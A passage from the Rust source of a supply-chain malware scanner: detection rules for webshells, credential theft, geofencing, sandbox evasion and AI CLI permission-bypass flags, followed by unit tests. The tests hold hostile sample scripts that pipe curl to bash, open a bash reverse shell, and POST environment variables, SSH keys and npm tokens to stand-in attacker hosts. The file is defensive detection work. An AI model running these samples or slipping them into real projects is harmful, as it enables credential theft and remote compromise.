                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_RUBY_BACKTICK, PAT_RUBY_BACKTICK) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "Ruby backtick command execution",
                                "Ruby backtick expressions execute shell commands. In Rakefile/extconf.rb this is a supply-chain risk.",
                            )
                            .with_rule_id("SB_RB_BACKTICK")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 11. PHP ───────────────────────────────────────────────────────────

        if matches!(kind, FileKind::Php) {
            if let Some(re) = get_re(&RE_PHP_EXEC, PAT_PHP_EXEC) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "PHP command execution function",
                                "exec/system/shell_exec/passthru/proc_open in PHP execute OS commands. Extremely common in PHP webshells.",
                            )
                            .with_rule_id("SB_PHP_EXEC")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_PHP_BASE64, PAT_PHP_BASE64) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_obfuscation = true;
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Obfuscation,
                                Severity::Critical,
                                Confidence::High,
                                "PHP eval+decode obfuscation (webshell pattern)",
                                "eval(base64_decode(...)) / eval(gzinflate(...)) is the canonical PHP webshell obfuscation technique.",
                            )
                            .with_rule_id("SB_PHP_EVAL_DECODE")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_PHP_PREG_REPLACE_E, PAT_PHP_PREG_REPLACE_E) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "PHP preg_replace /e modifier (code execution)",
                                "preg_replace() with the /e modifier evaluates the replacement as PHP code. Deprecated in PHP 5.5+ for this reason.",
                            )
                            .with_rule_id("SB_PHP_PREG_REPLACE_E")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 12. KB §4.4 SB-01..SB-12 + GAP-A ────────────────────────────────

        // SB-01: npm auth token field access
        if matches!(
            kind,
            FileKind::Javascript | FileKind::TypeScript | FileKind::Shell
        ) && let Some(re) = get_re(&RE_NPMRC_AUTH_TOKEN, PAT_NPMRC_AUTH_TOKEN)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "npm auth token field access",
                            "_authToken / npm_config__authtoken field access in a script. This is the exact credential harvested by every known npm worm for the publish step.",
                        )
                        .with_rule_id("SB_NPMRC_AUTH_TOKEN_READ")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-02: AI CLI coercion flags
        if matches!(
            kind,
            FileKind::Javascript | FileKind::TypeScript | FileKind::Shell
        ) && let Some(re) = get_re(&RE_AI_CLI_COERCION, PAT_AI_CLI_COERCION)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cmd_exec = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CommandExecution,
                            Severity::Critical,
                            Confidence::High,
                            "AI CLI permission-bypass flag in install script",
                            "--dangerously-skip-permissions / --yolo / --trust-all-tools invokes an AI assistant with all safety gates disabled. Used by s1ngularity/Nx for filesystem reconnaissance.",
                        )
                        .with_rule_id("SB_AI_CLI_COERCION")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-03: git global template directory persistence
        if matches!(
            kind,
            FileKind::Javascript | FileKind::TypeScript | FileKind::Shell
        ) && let Some(re) = get_re(&RE_GIT_TEMPLATE_DIR, PAT_GIT_TEMPLATE_DIR)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::FilesystemAbuse,
                            Severity::High,
                            Confidence::High,
                            "git global template directory hijack",
                            "git config --global init.templateDir in a lifecycle script installs a malicious git hook that fires on every future `git init`. SANDWORM_MODE persistence technique.",
                        )
                        .with_rule_id("SB_GIT_TEMPLATE_DIR_PERSIST")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-04: GitHub token prefix fingerprinting
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_GITHUB_TOKEN_PREFIX_CHECK, PAT_GITHUB_TOKEN_PREFIX_CHECK)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "GitHub token prefix fingerprinting",
                            "Checking for gho_/ghp_/ghr_/ghs_ token prefixes at install time validates harvested GitHub PATs before worm propagation. Used by s1ngularity to discard invalid tokens.",
                        )
                        .with_rule_id("SB_TELEGRAM_TOKEN_HARVEST")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-06: env var sweep with credential keyword regex
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_ENV_CRED_PATTERN_SWEEP, PAT_ENV_CRED_PATTERN_SWEEP)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "Credential-pattern regex sweep over environment variables",
                            "Regex matching /(TOKEN|KEY|SECRET|PASSWORD)/i applied to env var names sweeps ALL secrets from the environment. SANDWORM_MODE Stage 1 and MSTIC dep-confusion signature.",
                        )
                        .with_rule_id("SB_ENV_CREDENTIAL_PATTERN_SWEEP")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-07: Geofencing — IP geolocation API in lifecycle script
        if matches!(
            kind,
            FileKind::Javascript | FileKind::TypeScript | FileKind::Shell | FileKind::Python
        ) {
            if let Some(re) = get_re(&RE_GEOFENCE_GEO_API, PAT_GEOFENCE_GEO_API) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::High,
                                Confidence::High,
                                "IP geolocation API call in install script",
                                "Calling a geolocation API during package install is a supply-chain malware evasion technique — used to skip execution in CIS/analyst countries (ua-parser-js, node-ipc).",
                            )
                            .with_rule_id("SB_GEOFENCE_CIS_EXCLUSION")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_GEOFENCE_TIMEZONE, PAT_GEOFENCE_TIMEZONE) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Medium,
                                Confidence::Medium,
                                "Timezone-based geofencing in install script",
                                "Checking Intl.DateTimeFormat timezone or specific locale strings at install time is used to skip execution in targeted regions (CIS exclusion gate).",
                            )
                            .with_rule_id("SB_GEOFENCE_TIMEZONE")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // SB-08: Sandbox evasion — CI env check
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_SANDBOX_EVASION_CI, PAT_SANDBOX_EVASION_CI)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Obfuscation,
                            Severity::Medium,
                            Confidence::Medium,
                            "CI environment check (sandbox evasion)",
                            "process.env.CI check in an install script is used to skip execution in CI environments, targeting only real developer machines. SeedSweep and WhiteSnake signature.",
                        )
                        .with_rule_id("SB_SANDBOX_EVASION")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-08: Sandbox evasion — username/hostname analysis checks
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_SANDBOX_EVASION_USERNAME, PAT_SANDBOX_EVASION_USERNAME)
            && re.is_match(text.as_ref())
        {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::Obfuscation,
                    Severity::Medium,
                    Confidence::Medium,
                    "Analysis-environment username/hostname evasion check",
                    "Checking username/hostname for sandbox indicators (runner, jenkins, travis, etc.) is used to skip execution in security analysis environments.",
                )
                .with_rule_id("SB_SANDBOX_EVASION_HOSTNAME")
                .with_location(FileLocation::file(path)),
            );
        }

        // SB-09: String fragment reassembly of require() argument
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_STRING_FRAGMENT_REQUIRE, PAT_STRING_FRAGMENT_REQUIRE)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_obfuscation = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Obfuscation,
                            Severity::High,
                            Confidence::High,
                            "String fragment reassembly in require()",
                            "require() called with a string-concatenation argument hides the module name from literal grep. Exact technique used by eslint-config-prettier/Scavenger: require('chi'+'ld_pro'+'cess').",
                        )
                        .with_rule_id("SB_STRING_FRAGMENT_REASSEMBLY")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // SB-10: Double-encoded base64 C2 domain
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_DOUBLE_ENCODED_C2, PAT_DOUBLE_ENCODED_C2)
            && re.is_match(text.as_ref())
        {
            has_network_sink = true;
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::Obfuscation,
                    Severity::High,
                    Confidence::High,
                    "Double-encoded base64 C2 domain",
                    "Buffer.from(literal,'base64') where the literal decodes to another base64 string is the double-encoding technique used by the @am-fe campaign to hide C2 domain resolution.",
                )
                .with_rule_id("SB_DOUBLE_ENCODED_C2")
                .with_location(FileLocation::file(path)),
            );
        }

        // SB-12: Python .pth file with OS-branched exec at interpreter startup
        if matches!(kind, FileKind::Python)
            && path.ends_with(".pth")
            && let Some(re) = get_re(&RE_PTH_OS_BRANCH_EXEC, PAT_PTH_OS_BRANCH_EXEC)
            && re.is_match(text.as_ref())
        {
            has_cmd_exec = true;
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::FilesystemAbuse,
                    Severity::Critical,
                    Confidence::High,
                    "Python .pth interpreter-startup persistence with OS branch",
                    ".pth file containing os.name/sys.platform check fires at every Python interpreter startup before any user code. Used by CanisterSprawl and Hades for cross-platform persistence.",
                )
                .with_rule_id("SB_PTH_OS_BRANCH_EXEC")
                .with_location(FileLocation::file(path)),
            );
        }

        // GAP-A: eval(Buffer.from(...,'base64')...) — the wrapped/inverted form.
        // The existing SB_JS_BUF_B64_EVAL catches Buffer.from(...).toString() followed by eval().
        // This catches the mirrored form where eval() is the outermost call wrapping Buffer.from.
        // Emits the same rule_id so it is treated identically by scoring/allowlisting.
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_EVAL_BUF_B64_OUTER, PAT_EVAL_BUF_B64_OUTER)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_obfuscation = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Obfuscation,
                            Severity::High,
                            Confidence::High,
                            "eval() wrapping Buffer.from base64 decode",
                            "eval(Buffer.from(payload,'base64')...) is a Node.js obfuscation pattern that hides the executed payload as a base64 blob. The wrapped form with eval as outermost call.",
                        )
                        .with_rule_id("SB_JS_BUF_B64_EVAL")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // ── 13. Capability chain: credential read + network sink ──────────────
        //
        // This is the high-value "exfiltration chain" signal: the file
        // harvests a secret AND has a network sink — escalate to High/Critical
        // Exfiltration regardless of the individual finding severities.

        if has_cred_read && has_network_sink {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::Exfiltration,
                    Severity::Critical,
                    Confidence::High,
                    "Credential harvest + network exfiltration chain",
                    "The same file reads sensitive credential paths/values AND makes outbound network connections. This is the canonical data-exfiltration pattern in supply-chain malware.",
                )
                .with_rule_id("SB_CHAIN_CRED_EXFIL")
                .with_location(FileLocation::file(path)),
            );
        }

        // ── 14. Capability chain: obfuscation + command exec ─────────────────
        if has_obfuscation && has_cmd_exec {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::Obfuscation,
                    Severity::Critical,
                    Confidence::High,
                    "Obfuscated command execution",
                    "The file combines obfuscation techniques with command/code execution, strongly indicating an attempt to conceal malicious payload.",
                )
                .with_rule_id("SB_CHAIN_OBFUS_EXEC")
                .with_location(FileLocation::file(path)),
            );
        }

        // ── 15. Capability chain: download + obfuscation ──────────────────────
        if has_download && has_obfuscation {
            findings.push(
                Finding::new(
                    ENGINE,
                    ThreatCategory::CommandExecution,
                    Severity::Critical,
                    Confidence::High,
                    "Obfuscated download-and-execute",
                    "Remote code download combined with obfuscation. Two-stage dropper pattern — a near-certain malware indicator.",
                )
                .with_rule_id("SB_CHAIN_DL_OBFUS")
                .with_location(FileLocation::file(path)),
            );
        }
    }
}

impl DetectionEngine for ScriptBehaviorEngine {
    fn name(&self) -> &'static str {
        ENGINE
    }

    fn scan(&self, ctx: &ScanContext<'_>) -> Vec<Finding> {
        let mut findings = Vec::new();

        for file in ctx.files_where(|f| f.kind.is_script()) {
            // Skip files that exceed the configured size limit (the loader
            // already records the skip; we just skip analysis here too).
            if file.len() as u64 > ctx.config.max_file_size {
                continue;
            }

            // Skip binary-looking files — is_script() guarantees text, but
            // adversarial inputs could have NUL bytes.
            if !file.looks_textual() {
                continue;
            }

            let before = findings.len();
            self.analyze_file(file, &mut findings);
            let added = findings.len() - before;

            if added > 0 {
                tracing::debug!(
                    engine = ENGINE,
                    path = %file.rel_path,
                    findings = added,
                    "script behavior findings"
                );
            }

            // Respect the allowlist: remove any finding whose rule_id is
            // suppressed by the operator config.
            findings.retain(|f| {
                f.rule_id
                    .as_deref()
                    .map(|id| !ctx.config.is_allowlisted(id))
                    .unwrap_or(true)
            });
        }

        findings
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ScanConfig;
    use crate::engine::{FileKind, FileUnit, ScanContext};
    use crate::types::ThreatCategory;

    fn sha256_of(data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        h.update(data);
        hex::encode(h.finalize())
    }

    fn make_file(rel_path: &str, kind: FileKind, src: &str) -> FileUnit {
        let data = src.as_bytes().to_vec();
        let sha256 = sha256_of(&data);
        FileUnit {
            rel_path: rel_path.to_string(),
            data,
            kind,
            sha256,
        }
    }

    fn scan_single(file: FileUnit) -> Vec<Finding> {
        let config = ScanConfig::default();
        let files = vec![file];
        let ctx = ScanContext {
            target_name: "test".to_string(),
            files: &files,
            package_json: None,
            config: &config,
        };
        ScriptBehaviorEngine.scan(&ctx)
    }

    fn has_rule(findings: &[Finding], rule_id: &str) -> bool {
        findings
            .iter()
            .any(|f| f.rule_id.as_deref() == Some(rule_id))
    }

    fn has_category(findings: &[Finding], cat: ThreatCategory) -> bool {
        findings.iter().any(|f| f.category == cat)
    }

    // ── Positive: postinstall child_process.exec ───────────────────────────

    #[test]
    fn test_child_process_exec_flagged() {
        let src = r#"
const { exec } = require('child_process');
exec('curl https://evil.example.com/stage2 | bash', function(err, stdout) {
  console.log(stdout);
});
"#;
        let findings = scan_single(make_file("install.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_CHILD_PROCESS_REQUIRE"),
            "should detect child_process require; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_JS_EXEC_CALL"),
            "should detect .exec() call; got: {findings:#?}"
        );
        assert!(
            has_category(&findings, ThreatCategory::CommandExecution),
            "should flag CommandExecution"
        );
    }

    // ── Positive: env harvest + fetch chain → Exfiltration ────────────────

    #[test]
    fn test_env_harvest_fetch_exfiltration_chain() {
        let src = r#"
const env = Object.keys(process.env).reduce((acc, k) => {
  acc[k] = process.env[k];
  return acc;
}, {});

fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: JSON.stringify(env),
});
"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_PROCESS_ENV_ENUM"),
            "should detect env enumeration; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_JS_FETCH_XHR"),
            "should detect fetch network sink; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "should fire exfiltration chain rule; got: {findings:#?}"
        );
        let chain = findings
            .iter()
            .find(|f| f.rule_id.as_deref() == Some("SB_CHAIN_CRED_EXFIL"))
            .unwrap();
        assert_eq!(chain.severity, Severity::Critical);
        assert_eq!(chain.category, ThreatCategory::Exfiltration);
    }

    // ── Negative: benign console.log not flagged ───────────────────────────

    #[test]
    fn test_benign_console_log_no_findings() {
        let src = r#"
'use strict';
const msg = 'Hello, world!';
console.log(msg);
module.exports = { greet: () => msg };
"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            findings.is_empty(),
            "benign console.log should produce no findings; got: {findings:#?}"
        );
    }

    // ── Positive: eval(atob(...)) ──────────────────────────────────────────

    #[test]
    fn test_eval_atob_flagged() {
        let src = r#"eval(atob("Y29uc29sZS5sb2coJ2V2aWwnKQ=="));"#;
        let findings = scan_single(make_file("payload.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_EVAL_ATOB"),
            "eval(atob()) should be flagged; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_JS_EVAL"),
            "plain eval should also be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: Python subprocess + requests exfil ──────────────────────

    #[test]
    fn test_python_subprocess_requests_exfil() {
        let src = r#"
import subprocess
import requests
import os

creds = open(os.path.expanduser('~/.aws/credentials')).read()
requests.post('https://c2.evil.example.com/upload', data=creds)
result = subprocess.Popen(['id'], stdout=subprocess.PIPE).communicate()
"#;
        let findings = scan_single(make_file("setup.py", FileKind::Python, src));
        assert!(
            has_rule(&findings, "SB_PY_SUBPROCESS"),
            "should detect subprocess; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CRED_AWS_CREDS"),
            "should detect AWS creds access; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_PY_REQUESTS"),
            "should detect requests HTTP call; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "should fire exfil chain; got: {findings:#?}"
        );
    }

    // ── Positive: bash reverse shell ──────────────────────────────────────

    #[test]
    fn test_bash_reverse_shell() {
        let src = r#"#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
"#;
        let findings = scan_single(make_file("init.sh", FileKind::Shell, src));
        assert!(
            has_rule(&findings, "SB_REVSHELL_BASH"),
            "should detect bash reverse shell; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_REVSHELL_BASH"))
                .unwrap()
                .severity,
            Severity::Critical
        );
    }

    // ── Positive: curl | bash download-execute ────────────────────────────

    #[test]
    fn test_curl_bash_download_execute() {
        let src = r#"#!/bin/sh
curl -sSf https://evil.example.com/install.sh | bash
"#;
        let findings = scan_single(make_file("bootstrap.sh", FileKind::Shell, src));
        assert!(
            has_rule(&findings, "SB_DL_EXEC_CURL_BASH"),
            "curl|bash should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_DL_EXEC_CURL_BASH"))
                .unwrap()
                .severity,
            Severity::Critical
        );
    }

    // ── Positive: PowerShell IEX download ─────────────────────────────────

    #[test]
    fn test_powershell_iex_download() {
        let src = r#"
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')
"#;
        let findings = scan_single(make_file("setup.ps1", FileKind::PowerShell, src));
        assert!(
            has_rule(&findings, "SB_PS_IEX_DOWNLOAD"),
            "PS IEX download should be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: _0x obfuscated JS ───────────────────────────────────────

    #[test]
    fn test_0x_obfuscator_flagged() {
        // Minimal _0x-obfuscated stub with ≥5 distinct _0x identifiers
        let src = r#"
var _0x1a2b = ['exec', 'child_process', 'id'];
var _0x3c4d = require(_0x1a2b[1]);
var _0x5e6f = _0x3c4d[_0x1a2b[0]];
var _0x7a8b = _0x1a2b[2];
var _0x9c0d = _0x5e6f(_0x7a8b);
"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_0X_OBFUSCATOR"),
            "_0x obfuscator should be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: SSH key read + fetch (exfil chain) ─────────────────────

    #[test]
    fn test_ssh_key_exfil_chain() {
        let src = r#"
const fs = require('fs');
const key = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
fetch('https://attacker.example.com/keys', {
  method: 'POST',
  body: key,
});
"#;
        let findings = scan_single(make_file("preinstall.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_CRED_SSH_KEY"),
            "SSH key read should be flagged; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "exfil chain should fire; got: {findings:#?}"
        );
    }

    // ── Positive: .npmrc credential theft ─────────────────────────────────

    #[test]
    fn test_npmrc_credential_theft() {
        let src = r#"
const fs = require('fs');
const token = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
const https = require('https');
https.get('https://evil.example.com/?t=' + encodeURIComponent(token));
"#;
        let findings = scan_single(make_file("index.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_CRED_NPMRC"),
            "npmrc read should be flagged; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_CHAIN_CRED_EXFIL"),
            "exfil chain should fire; got: {findings:#?}"
        );
    }

    // ── Positive: PHP webshell eval(base64_decode) ────────────────────────

    #[test]
    fn test_php_eval_base64() {
        let src = r#"<?php eval(base64_decode('cGhwaW5mbygpOw==')); ?>"#;
        let findings = scan_single(make_file("index.php", FileKind::Php, src));
        assert!(
            has_rule(&findings, "SB_PHP_EVAL_DECODE"),
            "PHP eval+decode should be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: hex string chain ────────────────────────────────────────

    #[test]
    fn test_hex_string_chain() {
        let src = "var s = \"\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\";";
        let findings = scan_single(make_file("obfus.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_HEX_STR_CHAIN"),
            "hex escape chain should be flagged; got: {findings:#?}"
        );
    }

    // ── Negative: benign Python utility ───────────────────────────────────

    #[test]
    fn test_benign_python_no_findings() {
        let src = r#"
def add(a, b):
    return a + b

if __name__ == '__main__':
    print(add(1, 2))
"#;
        let findings = scan_single(make_file("util.py", FileKind::Python, src));
        assert!(
            findings.is_empty(),
            "benign Python should produce no findings; got: {findings:#?}"
        );
    }

    // ── Negative: benign shell script ─────────────────────────────────────

    #[test]
    fn test_benign_shell_no_findings() {
        let src = r#"#!/bin/bash
set -euo pipefail
echo "Building project..."
make -j4
echo "Done."
"#;
        let findings = scan_single(make_file("build.sh", FileKind::Shell, src));
        // echo/make are fine; the shell eval guard must not fire on echo
        let flagged: Vec<_> = findings
            .iter()
            .filter(|f| f.severity >= Severity::Medium)
            .collect();
        assert!(
            flagged.is_empty(),
            "benign build script should produce no medium+ findings; got: {findings:#?}"
        );
    }

    // ── Negative: allowlisted rule suppressed ────────────────────────────

    #[test]
    fn test_allowlisted_rule_suppressed() {
        let src = r#"const { exec } = require('child_process'); exec('id');"#;
        let mut config = ScanConfig::default();
        config
            .allowlisted_rule_ids
            .push("SB_JS_CHILD_PROCESS_REQUIRE".to_string());
        let file = make_file("install.js", FileKind::Javascript, src);
        let files = vec![file];
        let ctx = ScanContext {
            target_name: "test".to_string(),
            files: &files,
            package_json: None,
            config: &config,
        };
        let findings = ScriptBehaviorEngine.scan(&ctx);
        assert!(
            !has_rule(&findings, "SB_JS_CHILD_PROCESS_REQUIRE"),
            "allowlisted rule should be suppressed; got: {findings:#?}"
        );
    }

    // ── Positive: PowerShell execution policy bypass + encoded command ────

    #[test]
    fn test_powershell_bypass_encoded() {
        let src = r#"
powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA==
"#;
        let findings = scan_single(make_file("run.ps1", FileKind::PowerShell, src));
        assert!(
            has_rule(&findings, "SB_PS_EXEC_BYPASS"),
            "PS execution policy bypass should be flagged; got: {findings:#?}"
        );
        assert!(
            has_rule(&findings, "SB_PS_ENCODED_CMD"),
            "PS encoded command should be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: cron persistence ────────────────────────────────────────

    #[test]
    fn test_cron_persistence() {
        let src = r#"#!/bin/bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -
"#;
        let findings = scan_single(make_file("persist.sh", FileKind::Shell, src));
        assert!(
            has_rule(&findings, "SB_PERSIST_CRON"),
            "cron persistence should be flagged; got: {findings:#?}"
        );
        assert_eq!(
            findings
                .iter()
                .find(|f| f.rule_id.as_deref() == Some("SB_PERSIST_CRON"))
                .unwrap()
                .severity,
            Severity::Critical
        );
    }

    // ── Positive: Ruby system() in gemspec/Rakefile ───────────────────────

    #[test]
    fn test_ruby_system_exec() {
        let src = r#"
Gem::Specification.new do |s|
  s.name = 'mylib'
  s.extensions = ['ext/Rakefile']
end

system('curl https://evil.example.com | bash')
"#;
        let findings = scan_single(make_file("Rakefile", FileKind::Ruby, src));
        assert!(
            has_rule(&findings, "SB_RB_SYSTEM"),
            "Ruby system() should be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: fromCharCode loop (≥3 occurrences) ──────────────────────

    #[test]
    fn test_fromcharcode_loop() {
        let src = r#"
var a = String.fromCharCode(101, 118, 105, 108);
var b = String.fromCharCode(99, 117, 114, 108);
var c = String.fromCharCode(98, 97, 115, 104);
eval(a + ' ' + b + ' | ' + c);
"#;
        let findings = scan_single(make_file("payload.js", FileKind::Javascript, src));
        assert!(
            has_rule(&findings, "SB_JS_FROMCHARCODE"),
            "fromCharCode loop should be flagged; got: {findings:#?}"
        );
    }

    // ── Positive: base64 decode pipe to shell ─────────────────────────────

    #[test]
    fn test_base64_pipe_shell() {
        let src = r#"#!/bin/bash
echo "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vYS5zaHxiYXNo" | base64 -d | bash
"#;
        let findings = scan_single(make_file("dropper.sh", FileKind::Shell, src));
        assert!(
            has_rule(&findings, "SB_SH_BASE64_PIPE_EXEC"),
            "base64|bash should be flagged; got: {findings:#?}"
        );
    }

    // ── Engine name consistency ────────────────────────────────────────────

    #[test]
    fn test_engine_name_consistent() {
        let engine = ScriptBehaviorEngine;
        assert_eq!(engine.name(), ENGINE);

        // Any finding produced must also carry the same engine name
        let src = r#"const cp = require('child_process'); cp.exec('id');"#;
        let findings = scan_single(make_file("x.js", FileKind::Javascript, src));
        for f in &findings {
            assert_eq!(f.engine, ENGINE, "finding engine name mismatch: {f:#?}");
        }
    }

    // ── Evidence truncation ───────────────────────────────────────────────

    #[test]
    fn test_evidence_is_truncated() {
        // A line that is much longer than 160 bytes
        let long_line = format!(
            "const {{ exec }} = require('child_process'); exec('{}');",
            "A".repeat(500)
        );
        let findings = scan_single(make_file("x.js", FileKind::Javascript, &long_line));
        for f in &findings {
            if let Some(ev) = &f.evidence {
                assert!(
                    ev.len() <= 170, // 160 + possible '…' (3 bytes UTF-8)
                    "evidence should be truncated to ≤160 chars; got {} chars: {ev}",
                    ev.len()
                );
            }
        }
    }

    // ── KB §4.4 SB-01: npm auth token field access ────────────────────────

    #[test]
    fn test_sb01_npmrc_auth_token_read() {
        let src = r#"
const fs = require('fs');
const rc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
const token = rc.match(/\/\/registry\.npmjs\.org\/:_authToken=(.*)/)[1];
fetch('https://evil.example.com/steal?t=' + token);
"#;
        let findings = scan_single(make_file("postinstall.js", FileKind::Javascript, src));
        assert!(
